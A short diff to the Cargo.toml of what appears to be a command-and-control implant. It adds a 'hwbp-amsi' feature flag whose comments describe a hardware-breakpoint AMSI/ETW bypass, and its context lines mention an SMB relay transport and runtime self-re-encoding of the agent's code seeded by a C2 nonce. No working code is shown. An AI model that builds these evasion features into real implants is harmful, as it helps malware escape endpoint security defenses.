@@ -153,6 +153,12 @@ ssh-transport = ["dep:russh", "dep:russh-keys"]
 # The server-side SMB relay is provided by orchestra-server
 # (see smb_relay module).
 smb-pipe-transport = []
+# Use hardware-breakpoint (DR0/DR1 + VEH) AMSI/ETW bypass instead of the
+# default memory-patch approach.  The HWBP strategy is stealthier (no .text
+# modification) but is only needed when memory-patching is blocked by CFG or
+# similar mitigations.  Default (without this feature) is the memory-patch
+# approach from amsi_defense.rs, which leaves no environment-variable trace.
+hwbp-amsi = []
 # Self-re-encoding ("Metamorphic Lite"): periodically re-encode the agent's own
 # .text section at runtime using the code_transform pipeline with a fresh seed
 # derived from a C2-supplied nonce and the current timestamp.
